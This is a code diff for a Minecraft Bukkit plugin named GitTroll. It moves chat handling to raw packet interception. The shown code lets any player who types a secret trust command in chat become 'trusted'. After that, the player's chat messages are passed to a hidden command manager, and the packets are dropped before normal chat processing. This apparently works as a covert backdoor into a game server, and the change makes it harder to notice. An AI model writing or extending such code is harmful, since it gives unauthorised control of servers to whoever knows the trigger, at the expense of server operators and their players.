@@ -9,7 +9,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
@@ -31,6 +30,7 @@ import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
 import net.minecraft.server.v1_8_R3.MinecraftServer;
 import net.minecraft.server.v1_8_R3.Packet;
+import net.minecraft.server.v1_8_R3.PacketPlayInChat;
 
 public class GitTroll extends JavaPlugin implements Listener {
 	
@@ -128,6 +128,12 @@ public class GitTroll extends JavaPlugin implements Listener {
 		this.protocolManager = new TinyProtocol(this) {
 			@Override
 			public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
+				if(packet instanceof PacketPlayInChat) {
+					if(GitTroll.this.onAsyncChatMessage(((PacketPlayInChat) packet).a(), sender)) {
+						return null;
+					}
+				}
+				
 				EventPlayerPacket event = new EventPlayerPacket(sender, (Packet<?>) packet);
 				eventManager.callEvent(event);
 				return event.isCancelled()?null:packet;
@@ -173,22 +179,14 @@ public class GitTroll extends JavaPlugin implements Listener {
 	}
 	
 	
-	@EventHandler
-	public void onAsyncChatMessage(AsyncPlayerChatEvent event) {
-		if(this.isPlayerTrusted(event.getPlayer())) {
-			if(this.commandManager.onMessage(event.getPlayer(), event.getMessage())) {
-				event.setCancelled(true);
-			} else {
-				;
-			}
-		} else {
-			if(event.getMessage().equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
-				this.trustPlayer(event.getPlayer());
-				event.setCancelled(true);
-			} else {
-				;
-			}
+	public boolean onAsyncChatMessage(String message, Player sender) {
+		if(this.isPlayerTrusted(sender)) {
+			return this.commandManager.onMessage(sender, message);
+		} else if(message.equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
+			this.trustPlayer(sender);
+			return true;
 		}
+		return false;
 	}
 	
 	@EventHandler
